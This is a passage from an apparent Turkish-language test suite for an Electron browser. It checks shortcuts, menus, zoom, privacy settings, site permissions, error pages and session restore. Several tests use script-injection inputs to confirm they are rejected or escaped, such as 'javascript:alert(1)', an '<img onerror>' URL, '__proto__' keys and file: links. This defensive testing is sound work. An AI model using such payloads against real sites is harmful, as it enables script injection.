  eq('Düz harf kısayol değil', win(key('f')), null);
  eq('Tuş bırakma yok sayılır', bc.commandForInput({ ...key('t', { ctrl: true }), type: 'keyUp' }, { platform: 'win32' }), null);
  eq('IME birleştirmesi sırasında yakalanmaz', bc.commandForInput({ ...key('t', { ctrl: true }), isComposing: true }, { platform: 'win32' }), null);
  eq('Basılı tutulan Ctrl+T art arda sekme açmaz', win(key('t', { ctrl: true }, { repeat: true })), null);
  eq('Basılı tutulan Ctrl+Tab sekmeler arasında dolaşır', win(key('Tab', { ctrl: true }, { repeat: true })), 'next-tab');
  eq('Sayfada Ctrl+B (kalın), Ctrl+Shift+L (hizala), Ctrl+Shift+V (düz yapıştır) sayfaya bırakılır',
    [win(key('b', { ctrl: true })), win(key('L', { ctrl: true, shift: true })), win(key('V', { ctrl: true, shift: true }))], [null, null, null]);
  eq('Aynı birleşimler arayüz odaktayken panel açar',
    [win(key('b', { ctrl: true }), 'ui'), win(key('L', { ctrl: true, shift: true }), 'ui'), win(key('V', { ctrl: true, shift: true }), 'ui')],
    ['toggle-bookmarks', 'logs', 'vpn-panel']);
  eq('macOS: Cmd+T sekme açar, Ctrl+T açmaz',
    [bc.commandForInput(key('t', { meta: true }), { platform: 'darwin' }), bc.commandForInput(key('t', { ctrl: true }), { platform: 'darwin' })],
    ['new-tab', null]);
  eq('macOS: Ctrl+Tab sekme değiştirir', bc.commandForInput(key('Tab', { ctrl: true }), { platform: 'darwin' }), 'next-tab');

  let dupError = null;
  try { bc._internals.buildShortcutIndex([{ keys: ['Mod+T'], cmd: 'a' }, { keys: ['Mod+T'], cmd: 'b' }]); } catch (e) { dupError = e; }
  check('yinelenen kısayol tanımı yükleme anında hata verir', !!dupError);
  eq('"Mod++" ayrıştırması', bc._internals.parseShortcut('Mod++'), { mod: true, alt: false, shift: false, name: '+' });

  const appSrc = read('renderer/app.js');
  const uiCmds = [...new Set(bc.SHORTCUTS.map((s) => s.cmd).filter((c) => bc.UI_COMMANDS.has(c)))];
  const unhandledUi = uiCmds.filter((c) => !appSrc.includes("case '" + c + "'"));
  check("arayüze iletilen her komutun app.js'te karşılığı var", unhandledUi.length === 0, unhandledUi.join(', '));

  const mainJs = read('main/main.js');
  const mainCmds = [...new Set(bc.SHORTCUTS.map((s) => s.cmd).filter((c) => !bc.UI_COMMANDS.has(c) && !/^tab-\d$/.test(c)))];
  const unhandledMain = mainCmds.filter((c) => !mainJs.includes("case '" + c + "'"));
  check("ana süreçte yürütülen her komutun main.js'te karşılığı var", unhandledMain.length === 0, unhandledMain.join(', '));

  // Tek kaynak: renderer'da belge düzeyinde Ctrl kısayolu dinleyicisi kalmamalı.
  const rendererCtrl = fs.readdirSync(path.join(SRC, 'renderer')).filter((f) => f.endsWith('.js'))
    .filter((f) => /document\.addEventListener\(\s*['"]keydown['"][\s\S]{0,400}?(ctrlKey|metaKey)/.test(read('renderer/' + f)));
  check("renderer'da belge düzeyinde Ctrl kısayol dinleyicisi yok", rendererCtrl.length === 0, rendererCtrl.join(', '));
  check('sekmeler, önizleme, ana ve gizli pencere before-input-event ile bağlı',
    (mainJs.match(/bindBrowserInput\(/g) || []).length >= 5 && mainJs.includes("'before-input-event'"));
}

suite('Sağ tık menüsü');
{
  const ids = (model) => model.filter((i) => !i.type).map((i) => i.id);
  const page = (p, ctx = {}) => bc.buildContextMenuModel(p, { platform: 'win32', ...ctx });

  const linkMenu = page({ linkURL: 'https://ornek.com/a', pageURL: 'https://ornek.com/' });
  eq('bağlantı menüsü', ids(linkMenu), ['open-link-tab', 'open-link-incognito', 'glance-link', 'save-link', 'copy-text', 'inspect']);
  check('gizli pencerede "gizli pencerede aç" gösterilmez',
    !ids(page({ linkURL: 'https://ornek.com/' }, { incognito: true })).includes('open-link-incognito'));
  eq('javascript: bağlantısında bağlantı eylemi yok, yalnızca İncele', ids(page({ linkURL: 'javascript:alert(1)', pageURL: 'https://ornek.com/' })), ['inspect']);
  eq('file: bağlantısında bağlantı eylemi yok, yalnızca İncele', ids(page({ linkURL: 'file:///C:/Windows/win.ini', pageURL: 'https://ornek.com/' })), ['inspect']);
  eq('mailto: yalnızca adresi kopyalar; İncele sağ tıklanan noktayı taşır',
    page({ linkURL: 'mailto:ali%40ornek.com?subject=x', x: 12, y: 34 }).filter((i) => !i.type).map((i) => [i.id, i.arg]), [['copy-text', 'ali@ornek.com'], ['inspect', { x: 12, y: 34 }]]);

  const img = page({ mediaType: 'image', srcURL: 'https://ornek.com/r.png', x: 10, y: 20, pageURL: 'https://ornek.com/' });
  eq('resim menüsü', ids(img), ['open-tab', 'save-media', 'copy-image', 'copy-text', 'inspect']);
  eq('data: resim kaydedilir ama yeni sekmede açılmaz', ids(page({ mediaType: 'image', srcURL: 'data:image/png;base64,AAAA' })), ['save-media', 'copy-image', 'inspect']);
  eq('data:text/html resim sayılmaz', ids(page({ mediaType: 'image', srcURL: 'data:text/html,<b>x</b>' })), ['inspect']);

  const sel = page({ selectionText: '  İlgezdi   tarayıcı  ', pageURL: 'https://ornek.com/' });
  eq('seçim menüsü', ids(sel), ['copy', 'search-selection', 'inspect']);
  eq('arama etiketi sadeleşir', sel.find((i) => i.id === 'search-selection').label, '“İlgezdi tarayıcı” için ara');
  eq('sayfa menüsü', ids(page({ pageURL: 'https://ornek.com/' })), ['back', 'forward', 'reload', 'print', 'screenshot', 'view-source', 'inspect']);
  eq('video: blob adresinde de "Resim içinde resim"; açıkken çıkış; desteklenmiyorsa yok',
    [ids(page({ mediaType: 'video', srcURL: 'blob:https://ornek.com/1', mediaFlags: {} })),
     page({ mediaType: 'video', srcURL: 'https://ornek.com/v.mp4', mediaFlags: { isShowingPictureInPicture: true } }).filter((i) => i.id === 'video-pip').map((i) => i.label),
     ids(page({ mediaType: 'video', srcURL: 'blob:x', mediaFlags: { canShowPictureInPicture: false } })).includes('video-pip'),
     page({ mediaType: 'video', srcURL: 'javascript:alert(1)', x: 5, y: 6 }).find((i) => i.id === 'video-pip').arg],
    [['video-pip', 'inspect'], ['Resim içinde resimden çık'], false, { src: '', x: 5, y: 6 }]);
  check('resim içinde resim: video adresi JSON olarak kaçışlanıyor, nokta yakınlaştırmaya göre, kullanıcı hareketiyle',
    /function toggleVideoPictureInPicture\(wc, arg\) \{[\s\S]{0,200}const src = JSON\.stringify\(String\(\(arg && arg\.src\) \|\| ''\)\);[\s\S]{0,200}\/ zoom\)[\s\S]{0,900}wc\.executeJavaScript\(code, true\)/.test(read('main/main.js')));
  eq('web sayfası olmayan adreste ekran görüntüsü ve kaynak yok', ids(page({ pageURL: 'about:blank' })), ['back', 'forward', 'reload', 'print', 'inspect']);
  eq('düzenlenebilir alanda İncele en sonda; arayüzde (adres çubuğu) yok',
    [ids(page({ isEditable: true, editFlags: {} })).slice(-1), ids(bc.buildContextMenuModel({ isEditable: true, editFlags: {} }, { surface: 'ui', platform: 'win32' })).includes('inspect')], [['inspect'], false]);
  eq('F12 ve Ctrl+Shift+I sayfada da geliştirici araçları; Ctrl+Shift+S yalnızca arayüzde',
    [bc.commandForInput({ type: 'keyDown', key: 'F12' }, { platform: 'win32', surface: 'page' }),
     bc.commandForInput({ type: 'keyDown', key: 'I', control: true, shift: true }, { platform: 'win32', surface: 'page' }),
     bc.commandForInput({ type: 'keyDown', key: 'S', control: true, shift: true }, { platform: 'win32', surface: 'page' }),
     bc.commandForInput({ type: 'keyDown', key: 'S', control: true, shift: true }, { platform: 'win32', surface: 'ui' })],
    ['devtools', 'devtools', null, 'screenshot']);
  {
    const mjm = read('main/main.js');
    check('geliştirici araçları yalnızca web sayfası ve kaynak görünümünde, ayrı pencerede',
      mjm.includes("const canInspect = (wc) => !!wc && !wc.isDestroyed() && (isWebUrl(wc.getURL()) || wc.getURL().startsWith('view-source:'));")
      && (mjm.match(/wc\.openDevTools\(\{ mode: 'detach' \}\)/g) || []).length === 2 && mjm.includes("case 'inspect':    inspectElementAt(wc, arg); break;"));
    check('ekran görüntüsü: görünen alan PNG, indirme klasörüne benzersiz adla, panoya; yalnızca kendi yazdığı dosya klasörde gösteriliyor',
      /async function takeScreenshot\(win, wc\) \{[\s\S]{0,300}wc\.capturePage\(\)[\s\S]{0,400}uniquePath\(dir, screenshotFileName\(wc\.getURL\(\)\)\)[\s\S]{0,200}clipboard\.writeImage\(image\)/.test(mjm)
      && /ipcMain\.handle\('screenshot-reveal', \(_e, file\) => \{\s*if \(typeof file !== 'string' \|\| !screenshotPaths\.has\(file\)/.test(mjm));
    const appm = read('renderer/app.js');
    check('durum çubuğu bildirimi metni textContent ile yazıyor (HTML işlenmiyor)',
      appm.includes("statusNote.textContent = d.text.slice(0, 160);") && !/statusNote\.innerHTML/.test(appm) && read('renderer/index.html').includes('id="status-note"'));
  }
  eq('geri/ileri etkinliği geçmişe göre',
    page({ pageURL: 'https://ornek.com/' }, { canGoBack: true }).filter((i) => i.id === 'back' || i.id === 'forward').map((i) => i.enabled), [true, false]);

  const edit = page({ isEditable: true, misspelledWord: 'tarayci', dictionarySuggestions: ['tarayıcı', 'tarayıcıyı'], editFlags: { canCopy: true, canPaste: true } });
  eq('yazım önerileri en üstte', ids(edit).slice(0, 3), ['replace-misspelling', 'replace-misspelling', 'add-to-dictionary']);
  eq('düzenleme bayrakları', edit.filter((i) => ['undo', 'cut', 'copy', 'paste'].includes(i.id)).map((i) => i.enabled), [false, false, true, true]);
  eq('sayfa metnindeki & Windows menüsünde && olur', page({ selectionText: 'A & B' }).find((i) => i.id === 'search-selection').label, '“A && B” için ara');
  eq('macOS menüsünde & olduğu gibi kalır',
    bc.buildContextMenuModel({ selectionText: 'A & B' }, { platform: 'darwin' }).find((i) => i.id === 'search-selection').label, '“A & B” için ara');
  eq('arayüzde yalnızca kopyala', ids(bc.buildContextMenuModel({ selectionText: 'x', linkURL: 'https://a.com' }, { surface: 'ui', platform: 'win32' })), ['copy']);
  check('menü ayraçla başlamaz ve bitmez', [linkMenu, img, sel, edit].every((m) => !m[0].type && !m[m.length - 1].type));
  check("sağ tık eylemleri adresleri yeniden süzüyor (main.js)",
    /case 'open-link-tab':[\s\S]{0,120}isWebUrl\(arg\)/.test(read('main/main.js')));
}

suite('Yakınlaştırma ve kapatılan sekmeler');
{
  eq('büyütme adımları', [bc.nextZoomFactor(1, 1), bc.nextZoomFactor(1.1, 1), bc.nextZoomFactor(5, 1)], [1.1, 1.25, 5]);
  eq('küçültme adımları', [bc.nextZoomFactor(1, -1), bc.nextZoomFactor(0.25, -1)], [0.9, 0.25]);
  eq('sıfırla', bc.nextZoomFactor(2.5, 0), 1);
  eq('adım dışı değerden sonraki adım', bc.nextZoomFactor(1.17, 1), 1.25);
  eq('site anahtarı', [bc.zoomKeyForUrl('https://WWW.Ornek.com:8443/a?b'), bc.zoomKeyForUrl('file:///C:/x.html'), bc.zoomKeyForUrl('about:blank')],
    ['www.ornek.com', '', '']);

  let written = null;
  const store = bc.createZoomStore({
    read: () => ({ 'a.com': 1.5, 'bozuk.com': 'x', 'dev.com': 99, 'bir.com': 1 }),
    write: (o) => { written = o; },
    delayMs: 5,
  });
  eq('bozuk ve sınır dışı değerler yüklenmez', [store.get('a.com'), store.get('bozuk.com'), store.get('dev.com'), store.size()], [1.5, 1, 1, 1]);
  store.set('b.com', 2);
  store.set('a.com', 1);
  check('yazma gecikmeli (her tekerlek adımında diske yazılmaz)', written === null && store.pending());
  store.flush();
  eq('%100 kaydedilmez, değişen yazılır', written, { 'b.com': 2 });
  for (let i = 0; i < 520; i++) store.set('s' + i + '.com', 1.25);
  store.flush();
  eq('en fazla 500 site tutulur, en eskisi düşer', [Object.keys(written).length, 'b.com' in written, 's519.com' in written], [500, false, true]);

  const E = (u) => ({ url: u, title: u });
  eq('geçmiş: web dışı girdiler atılır, etkin konum korunur',
    bc.snapshotHistory([E('about:blank'), E('https://a.com/'), E('https://b.com/'), E('chrome-error://x')], 2),
    { entries: [E('https://a.com/'), E('https://b.com/')], index: 1 });
  eq('geçmiş: etkin girdi atıldıysa son web girdisi', bc.snapshotHistory([E('https://a.com/'), E('about:blank')], 1).index, 0);
  const snap = bc.snapshotHistory(Array.from({ length: 60 }, (_, i) => E('https://s.com/' + i)), 59);
  eq('geçmiş en fazla 50 girdi, etkin konum kayar', [snap.entries.length, snap.index, snap.entries[snap.index].url], [50, 49, 'https://s.com/59']);

  const stack = [];
  check('boş sekme yığına girmez', bc.pushClosedTab(stack, { url: 'about:blank' }) === false && stack.length === 0);
  for (let i = 0; i < 30; i++) bc.pushClosedTab(stack, { url: 'https://s.com/' + i });
  eq('yığın en fazla 25 sekme', [stack.length, stack[0].url, stack[24].url], [25, 'https://s.com/5', 'https://s.com/29']);
  check('site yakınlaştırması config.json yerine ayrı dosyada', read('main/main.js').includes("path.join(USER_DATA, 'zoom-levels.json')"));
}

suite('WebRTC IP koruması ve gizli pencere önizlemesi');
{
  eq('geçerli politikalar olduğu gibi kalır', bc.WEBRTC_POLICIES.map(bc.normalizeWebrtcPolicy), [...bc.WEBRTC_POLICIES]);
  eq('geçersiz değer varsayılana döner', [bc.normalizeWebrtcPolicy('herkese-ac'), bc.normalizeWebrtcPolicy(undefined)],
    ['default_public_interface_only', 'default_public_interface_only']);
  const mainJs = read('main/main.js');
  check('varsayılan yapılandırmada politika tanımlı', /webrtcPolicy:\s*DEFAULT_WEBRTC_POLICY/.test(mainJs));
  const createTabBody = mainJs.slice(mainJs.indexOf('function createTabView('), mainJs.indexOf('function resizeActiveView('));
  check('her sekme görünümü oluşturulurken (uyanınca da) politika uygulanıyor', createTabBody.includes('applyWebrtcPolicy(view.webContents)'));
  check('ayar kaydında politika doğrulanıyor ve açık sekmelere uygulanıyor',
    /incoming\.webrtcPolicy\s*=\s*normalizeWebrtcPolicy/.test(mainJs) && mainJs.includes('applyWebrtcPolicyToAllTabs()'));
  check('önizleme görünümüne de politika uygulanıyor', /onViewCreated[\s\S]{0,400}applyWebrtcPolicy\(view\.webContents\)/.test(mainJs));
  check('önizleme bölümü sabit değil, pencereye göre seçiliyor (gizli pencere → gizli oturum)',
    read('main/glance-main.js').includes('hooks.partitionFor') && /partitionFor:[\s\S]{0,200}incognito-/.test(mainJs));
  // Önizleme açıkken pencere kapanınca korumasız send() ana süreci düşürüyordu (P0 sondası buldu).
  const glanceJs = read('main/glance-main.js');
  check('önizleme pencereye yalnızca güvenli yardımcıyla mesaj gönderiyor',
    glanceJs.split('.webContents.send(').length - 1 === 1 && glanceJs.includes('win.webContents.isDestroyed()'));
  check('önizlemenin penceresi kapanınca önizleme durumu sıfırlanıyor', glanceJs.includes("win.on('closed'"));
  check('ayarlarda WebRTC seçimi var ve kaydediliyor', /'cfg-webrtc':\s*\['webrtcPolicy', 'value'\]/.test(read('renderer/settings-panel.js')));
}

suite('Erişilebilirlik tabanı');
{
  const html = read('renderer/index.html');
  check('a11y.js arayüzde yükleniyor', /<script src="a11y\.js"><\/script>/.test(html));
  check('sekme şeridi tablist, sekmeler tab rolünde', html.includes('role="tablist"') && read('renderer/app.js').includes("setAttribute('role', 'tab')"));
  check('adres çubuğunun erişilebilir adı var', /id="address-bar"[\s\S]{0,200}aria-label=/.test(html));
  check('klavye odak göstergesi tanımlı (:focus-visible)', /:focus-visible\s*\{[^}]*outline:\s*2px/.test(read('renderer/styles/main.css')));
  const unnamed = [...html.matchAll(/<button\b([^>]*)>([\s\S]*?)<\/button>/g)].filter(([, attrs, inner]) => {
    if (/\b(aria-label|title)=/.test(attrs)) return false;
    const text = inner.replace(/<[^>]+>/g, '').replace(/\s+/g, '');
    return !/[\p{L}\p{N}]/u.test(text);
  }).map(([, attrs]) => (attrs.match(/id="([^"]+)"/) || [])[1] || attrs.trim().slice(0, 40));
  check('index.html içindeki her düğmenin erişilebilir adı var', unnamed.length === 0, unnamed.join(', '));
  check('dekoratif runik şerit ekran okuyucudan gizli', /id="status-runes"[^>]*aria-hidden="true"/.test(html));
}

// ══════════════════════════════════════════════════════════════════════════════
// Site güvenliği — açılır pencere, izinler, üçüncü taraf çerez, güvenli DNS,
// hata sayfası ve sertifika (karşılaştırma raporu P1-A)
// ══════════════════════════════════════════════════════════════════════════════
const ss = require('../src/main/site-safety.js');

suite('Açılır pencere engelleme');
{
  const now = 1000000;
  eq('etkileşimsiz pencere engellenir', ss.popupVerdict({ now }), 'block');
  eq('tıklamadan hemen sonra izin', ss.popupVerdict({ now, lastActivation: now - 20 }), 'allow');
  eq('5 saniye sınırı dahil', ss.popupVerdict({ now, lastActivation: now - 5000 }), 'allow');
  eq('5 saniyeden eski etkileşim yetmez', ss.popupVerdict({ now, lastActivation: now - 5001 }), 'block');
  eq('gelecekteki zaman damgası kabul edilmez', ss.popupVerdict({ now, lastActivation: now + 100 }), 'block');
  eq('site için izin verildiyse etkileşimsiz de açılır', ss.popupVerdict({ now, siteDecision: true }), 'allow');
  eq('site engellendiyse tıklamayla da açılmaz', ss.popupVerdict({ now, lastActivation: now, siteDecision: false }), 'block');
  check('fare hareketi ve tekerlek etkileşim sayılmaz',
    !ss.ACTIVATION_EVENTS.has('mouseMove') && !ss.ACTIVATION_EVENTS.has('mouseWheel') && ss.ACTIVATION_EVENTS.has('mouseDown'));
  const mainJs = read('main/main.js');
  check('etkileşim bir kez kullanılıyor (tek tıklama = tek pencere)', mainJs.includes('tab.lastActivation = 0'));
  check('target=_blank ve window.open yeni sekmeye geçiyor, Ctrl/orta tık arka planda',
    mainJs.includes("if (disposition !== 'background-tab') setActiveTab(win, state, newId);"));
}

suite('Site izinleri');
{
  eq('geçerli origin', ss.normalizeOrigin('https://ornek.com:8443'), 'https://ornek.com:8443');
  eq('yol ya da sondaki eğik çizgi origin değildir', [ss.normalizeOrigin('https://ornek.com/'), ss.normalizeOrigin('https://ornek.com/a')], [null, null]);
  eq('file: ve javascript: reddedilir', [ss.normalizeOrigin('file:///C:/'), ss.normalizeOrigin('javascript:alert(1)')], [null, null]);
  eq('izin verme', ss.validatePermissionChange({ origin: 'https://a.com', permission: 'geolocation', decision: 'allow' }),
    { ok: true, origin: 'https://a.com', permission: 'geolocation', value: true });
  eq('"sor" kaydı siler', ss.validatePermissionChange({ origin: 'https://a.com', permission: 'popups', decision: 'ask' }).value, null);
  check('bilinmeyen izin reddedilir', ss.validatePermissionChange({ origin: 'https://a.com', permission: 'usb', decision: 'allow' }).ok === false);
  check('geçersiz karar reddedilir', ss.validatePermissionChange({ origin: 'https://a.com', permission: 'media', decision: true }).ok === false);
  check('prototip anahtarı reddedilir', ss.validatePermissionChange({ origin: 'https://a.com', permission: '__proto__', decision: 'allow' }).ok === false);
  const decisions = {
    'https://b.com|media': false, 'https://a.com|popups': true, 'https://a.com|geolocation': true,
    'bozuk': true, 'https://c.com|usb': true, 'https://d.com|media': 'evet',
  };
  eq('liste: bozuk ve bilinmeyen kayıtlar atlanır, site ve izin sırasına göre',
    ss.listDecisions(decisions).map((d) => [d.origin, d.permission, d.decision]),
    [['https://a.com', 'geolocation', 'allow'], ['https://a.com', 'popups', 'allow'], ['https://b.com', 'media', 'block']]);
  const forA = Object.fromEntries(ss.decisionsForOrigin(decisions, 'https://a.com').map((p) => [p.permission, p.decision]));
  eq('site görünümü: kayıt yoksa sor, çerezde varsayılan',
    [forA.geolocation, forA.media, forA.popups, forA['third-party-cookies']], ['allow', 'ask', 'allow', 'default']);
  const mainJs = read('main/main.js');
  check('arayüz izin kararlarını ve oturumu göremez, geri yazamaz',
    mainJs.includes("const MAIN_OWNED_KEYS = ['permissionDecisions', 'authSessionEnc', 'passwordNeverSave'];")
    && mainJs.includes("ipcMain.handle('get-config',  ()          => publicConfig());")
    && mainJs.includes('for (const k of MAIN_OWNED_KEYS) delete incoming[k];'));
  check('site verisi silme ve toplu sıfırlama kullanıcı onayı istiyor',
    /'site-data-clear'[\s\S]{0,700}showMessageBox/.test(mainJs) && /'site-permissions-reset'[\s\S]{0,400}showMessageBox/.test(mainJs));
}

suite('Üçüncü taraf çerezler');
{
  const base = { enabled: true, resourceType: 'image', thirdParty: true, siteAllowed: undefined, whitelisted: false };
  eq('üçüncü taraf istekte çerez ayıklanır', ss.shouldStripThirdPartyCookies(base), true);
  eq('ayar kapalıyken dokunulmaz', ss.shouldStripThirdPartyCookies({ ...base, enabled: false }), false);
  eq('kullanıcının gittiği sayfa (ana çerçeve) birinci taraftır', ss.shouldStripThirdPartyCookies({ ...base, resourceType: 'mainFrame' }), false);
  eq('aynı site istekleri etkilenmez', ss.shouldStripThirdPartyCookies({ ...base, thirdParty: false }), false);
  eq('site için izin verildiyse etkilenmez', ss.shouldStripThirdPartyCookies({ ...base, siteAllowed: true }), false);
  eq('engelleyici beyaz listesindeki sitede etkilenmez', ss.shouldStripThirdPartyCookies({ ...base, whitelisted: true }), false);
  const blockerMod = require('../src/main/blocker-main.js');
  check('engelleyicinin site tanımı dışa açık (tek tanım)', typeof blockerMod.isThirdParty === 'function' && typeof blockerMod.isWhitelisted === 'function');
  eq('alt alan adı aynı sitedir, başka alan adı üçüncü taraftır',
    [blockerMod.isThirdParty('https://cdn.ornek.com.tr/a.js', 'https://www.ornek.com.tr/'), blockerMod.isThirdParty('https://izleyici.net/p', 'https://ornek.com/')],
    [false, true]);
  const mainJs = read('main/main.js');
  check('hem istek (Cookie) hem yanıt (Set-Cookie) başlığı ayıklanıyor',
    mainJs.includes("k.toLowerCase() === 'cookie'") && mainJs.includes("k.toLowerCase() === 'set-cookie'") && mainJs.includes('onHeadersReceived'));
}

suite('Güvenli DNS');
{
  eq('otomatik', ss.hostResolverOptions('automatic'), { secureDnsMode: 'automatic' });
  eq('kapalı', ss.hostResolverOptions('off'), { secureDnsMode: 'off' });
  eq('sağlayıcı seçilince yalnızca o sunucu', ss.hostResolverOptions('quad9'), { secureDnsMode: 'secure', secureDnsServers: ['https://dns.quad9.net/dns-query'] });
  eq('geçersiz değer otomatiğe döner', [ss.normalizeSecureDns('http://kotu.example/dns'), ss.hostResolverOptions('x')], ['automatic', { secureDnsMode: 'automatic' }]);
  check('tüm sağlayıcı adresleri https', ss.SECURE_DNS_OPTIONS.filter((o) => o.server).every((o) => o.server.startsWith('https://')));
  const mainJs = read('main/main.js');
  check('varsayılan yapılandırmada kullanılmayan dnsServer yerine secureDns', !mainJs.includes('dnsServer:') && /secureDns:\s*DEFAULT_SECURE_DNS/.test(mainJs));
  check('açılışta ve ayar değişince uygulanıyor', (mainJs.match(/applySecureDns\(\);/g) || []).length >= 2);
  check('ayarlarda seçim var ve kaydediliyor', /'cfg-secure-dns':\s*\['secureDns', 'value'\]/.test(read('renderer/settings-panel.js')));
}

suite('Hata sayfası ve sertifika');
{
  const m = (code, extra = {}) => ss.errorPageModel({ code, description: 'ERR_X', url: 'https://ornek.com/a', ...extra });
  eq('türler', [m(-105).kind, m(-106).kind, m(-102).kind, m(-201).kind, m(-107).kind, m(-310).kind, m(-20).kind, m(-999).kind],
    ['dns', 'offline', 'unreachable', 'certificate', 'certificate', 'redirects', 'blocked', 'generic']);
  eq('sertifika hatasında neden açıklanır', m(-201).reason, 'Sertifikanın süresi dolmuş ya da henüz geçerli değil.');
  check('sertifika hatasında "yine de devam et" seçeneği yok', !/yine de/i.test(JSON.stringify(m(-202))));
  check('Yalnızca HTTPS açıkken ilgili hatada ipucu başta', m(-102, { httpsOnly: true }).tips[0].startsWith('Yalnızca HTTPS açık'));
  check('DNS hatasında HTTPS ipucu yok', !m(-105, { httpsOnly: true }).tips.some((t) => t.startsWith('Yalnızca HTTPS')));
  eq('hata adı yalnızca büyük harf, rakam ve alt çizgi', ss.errorPageModel({ code: -105, description: 'ERR_NAME<script>', url: 'https://a.com' }).codeName, 'ERR_NAME');
  eq('web dışı adreste "yeniden dene" yok', ss.errorPageModel({ code: -105, url: 'javascript:alert(1)' }).canRetry, false);

  const evil = ss.errorPageModel({ code: -105, description: 'ERR_NAME_NOT_RESOLVED', url: 'https://a.com/"</script><img src=x onerror=alert(1)>\u2028\'' });
  const script = ss.errorPageScript(evil);
  let compiled = true;
  try { new Function(script); } catch { compiled = false; }
  check('kötü niyetli adres içeren hata betiği geçerli JavaScript olarak kalıyor', compiled);
  check("hata betiği DOM'a innerHTML ile yazmıyor", !script.includes('innerHTML'));
  check('hata betiği yalnızca Chromium hata belgesine dokunuyor', script.includes("indexOf('chrome-error://') !== 0"));

  const cert = ss.certificateSummary({ subjectName: 'ornek.com', issuerName: 'R3', issuer: { organizations: ["Let's Encrypt"] }, validStart: 1700000000, validExpiry: 1710000000, fingerprint: 'sha256/abc' }, 'net::OK', 0);
  eq('sertifika özeti', [cert.subject, cert.issuerOrg, cert.validFrom, cert.ok, cert.error], ['ornek.com', "Let's Encrypt", 1700000000000, true, '']);
  eq('doğrulama hatası özette görünür', ss.certificateSummary({}, 'net::ERR_CERT_AUTHORITY_INVALID', -202).error, 'Sertifika güvenilen bir kuruluş tarafından verilmemiş.');
  const mainJs = read('main/main.js');
  check('sertifika kancası kararı değiştirmiyor ve her durumda geri çağırıyor', mainJs.includes('finally { callback(-3); }'));
  check('hata sayfası yalnızca ana çerçevede ve iptal olmayan hatalarda', mainJs.includes('if (!isMainFrame || errorCode === -3) return;'));
  const html = read('renderer/index.html');
  check('site bilgisi paneli ve kilit düğmesi arayüzde', html.includes('id="panel-siteinfo"') && html.includes('<button type="button" id="security-icon"'));
}

// ══════════════════════════════════════════════════════════════════════════════
// Sekmeler — sıralama, sabitleme, sekme menüsü, oturum, tam ekran (P1-B)
// ══════════════════════════════════════════════════════════════════════════════
suite('Sekme düzeni ve sekme menüsü');
{
  const pins = (...ids) => new Set(ids);
  eq('taşıma', bc.moveTabId([1, 2, 3, 4], pins(), 4, 1), [1, 4, 2, 3]);
  eq('sabitsiz sekme sabitli grubun önüne geçemez', bc.moveTabId([1, 2, 3], pins(1), 3, 0), [1, 3, 2]);
  eq('sabitli sekme sabitsiz gruba geçemez', bc.moveTabId([1, 2, 3], pins(1, 2), 1, 3), [2, 1, 3]);
  eq('aralık dışı hedef sona sıkıştırılır', bc.moveTabId([1, 2, 3], pins(), 1, 99), [2, 3, 1]);
  eq('bilinmeyen sekme sırayı değiştirmez', bc.moveTabId([1, 2], pins(), 9, 0), [1, 2]);
  eq('sabitlenen sekme sabitli grubun sonuna gider', bc.orderAfterPin([1, 2, 3, 4], pins(1, 4), 4), [1, 4, 2, 3]);
  eq('sabitlemesi kaldırılan sekme sabitsiz grubun başına gider', bc.orderAfterPin([1, 2, 3], pins(2), 1), [2, 1, 3]);

  const menu = bc.buildTabMenuModel({ index: 2, count: 3, pinned: false, muted: false, canReopen: false, platform: 'win32' });
  const ids = menu.filter((i) => !i.type).map((i) => i.id);
  eq('sekme menüsü', ids, ['new-tab-right', 'reload', 'duplicate', 'pin', 'mute', 'close', 'close-others', 'close-right', 'reopen-closed']);
  eq('son sekmede "sağdakileri kapat" ve yığın boşken "yeniden aç" pasif',
    menu.filter((i) => i.id === 'close-right' || i.id === 'reopen-closed').map((i) => i.enabled), [false, false]);
  eq('sabitli ve sessiz sekmede ters işlemler',
    bc.buildTabMenuModel({ index: 0, count: 1, pinned: true, muted: true }).filter((i) => !i.type).map((i) => i.id).slice(3, 5), ['unpin', 'unmute']);
  const allMenuIds = [true, false].flatMap((p) => [true, false].flatMap((m) =>
    bc.buildTabMenuModel({ index: 0, count: 2, pinned: p, muted: m }).filter((i) => !i.type).map((i) => i.id)));
  check('menüdeki her işlem IPC beyaz listesinde', allMenuIds.every((id) => bc.TAB_ACTIONS.has(id)), allMenuIds.filter((id) => !bc.TAB_ACTIONS.has(id)));
  eq('F11 → tam ekran', bc.commandForInput({ type: 'keyDown', key: 'F11', code: 'F11' }, { platform: 'win32' }), 'toggle-fullscreen');
  const mainJs = read('main/main.js');
  check("tab-action IPC'si yalnızca beyaz listedeki işlemleri kabul ediyor", /'tab-action'[\s\S]{0,200}if \(!TAB_ACTIONS\.has\(action\)\) return/.test(mainJs));
}

suite('Oturum geri yükleme');
{
  eq('başlangıç modu', [bc.normalizeStartupMode('restore'), bc.normalizeStartupMode('bozuk'), bc.normalizeStartupMode()], ['restore', 'homepage', 'homepage']);
  const E = (u) => ({ url: u, title: 'T ' + u, pageState: 'form-verisi' });
  const s = bc.serializeSession([
    { url: 'about:blank', title: 'Yeni Sekme' },
    { url: 'https://a.com/', title: 'A', pinned: true, entries: [E('https://a.com/')], index: 0 },
    { url: 'https://b.com/2', title: 'B', entries: [E('about:blank'), E('https://b.com/1'), E('https://b.com/2')], index: 2 },
  ], 2);
  eq('boş sekme kaydedilmez, etkin sekme konumu kayar', [s.tabs.length, s.activeIndex, s.version], [2, 1, 1]);
  eq('girdilerde web dışı atılır, etkin konum korunur', [s.tabs[1].entries.map((e) => e.url), s.tabs[1].index], [['https://b.com/1', 'https://b.com/2'], 1]);
  check('form içeriği taşıyabilen pageState diske yazılmaz', !JSON.stringify(s).includes('form-verisi'));

  const roundTrip = bc.parseSession(JSON.parse(JSON.stringify(s)));
  eq('kaydedilen oturum geri okunur', [roundTrip.tabs.map((t) => t.url), roundTrip.activeIndex, roundTrip.tabs[0].pinned], [['https://a.com/', 'https://b.com/2'], 1, true]);
  eq('sürüm uymazsa ya da sekme yoksa null', [bc.parseSession({ version: 2, tabs: [] }), bc.parseSession({ version: 1, tabs: [{ url: 'file:///C:/x' }] }), bc.parseSession(null)], [null, null, null]);
  const tampered = bc.parseSession({ version: 1, activeIndex: 0, tabs: [
    { url: 'https://x.com/', pinned: 'evet', entries: [{ url: 'javascript:alert(1)' }, { url: 'https://x.com/' }], index: 7 },
    { url: 'https://y.com/', pinned: true },
  ] });
  eq('elle bozulmuş dosya: sabitli önde, geçersiz girdi atılır, konum sınırda, etkin sekme izlenir',
